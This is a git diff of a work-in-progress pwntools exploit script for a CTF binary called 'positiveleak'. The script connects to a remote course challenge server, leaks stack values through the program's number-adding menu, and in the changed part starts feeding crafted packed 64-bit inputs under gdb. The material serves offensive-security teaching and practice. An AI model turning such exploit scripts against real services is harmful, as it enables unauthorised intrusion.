@@ -16,20 +16,12 @@ def genbin(binary_name):
 		print(f"An exception occurred: {e}")
 		exit(-1)
 
-def gdb_attach(r):
-    input("wait")
-    gdb.attach(r, """
-	unset env
-	set disable-randomization off
-	c
-	""")
-
 
 # takes an integer as input and displays the value on the stack at index i
-# it asusmes you ar ein menu once invoked
+# it asusmes you are in menu once invoked
 def get_leak(i):
-    r.recvrepeat(timeout=0.1)
-    time.sleep(0.3)
+    r.recvrepeat(timeout=0.2)
+    time.sleep(0.2)
     r.sendline(b"0")            #add numbers
     time.sleep(0.2)
     r.sendline(str(i).encode()) # number of numbers I wanna add
@@ -46,18 +38,32 @@ def get_leak(i):
     print(value)
 
 context.terminal = ['tmux', 'splitw', '-h']
-context.log_level = "error"
+#context.log_level = "error"
 warnings.filterwarnings("ignore", category=BytesWarning)
+
+
+# breakpoints
+add_numbers = "add_numbers:167"
+
 
 if args["REMOTE"]:
 	r = remote("bin.offdef.jinblack.it", 3003)
 else:
-	r = process("./positiveleak")
+    r = process("./positiveleak")
+    gdb.attach(r, f"""
+    b {add_numbers}
+    unset env
+    set disable-randomization off
+    c
+    """)
 
-for i in range(40):
-    get_leak(i)
-
-
-gdb_attach(r)
+input("wait")
+r.sendline(b"0") # add numbers
+time.sleep(0.2)
+r.sendline(b"11")
+time.sleep(0.2)
+for i in range(11):
+    r.sendline(p64(i)+b"\x00")
+    time.sleep(0.2)
 
 r.interactive()
